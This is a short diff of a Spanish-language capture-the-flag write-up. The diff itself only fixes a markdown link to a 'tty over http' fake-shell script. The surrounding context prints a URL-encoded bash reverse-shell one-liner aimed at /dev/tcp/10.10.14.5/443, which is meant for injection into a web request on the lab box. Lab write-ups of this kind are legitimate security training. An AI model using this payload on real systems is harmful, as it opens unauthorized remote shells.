@@ -85,7 +85,7 @@ Asi que subirmeos el clasico:
 SI le pasamos el comando de reverse shell (con los & urlencodeados a %26)
 ```bash -c 'bash -i >%26 /dev/tcp/10.10.14.5/443 0>%261'```
 
-La manera es hacer una fake shell para operar con un script (tty over http)[https://github.com/CUCUxii/ttyhttp.py/blob/main/ttyhttp.py]
+La manera es hacer una fake shell para operar con un script [tty over http](https://github.com/CUCUxii/ttyhttp.py/blob/main/ttyhttp.py)
 
 ```console
 └─$ rlwrap ./inception.py
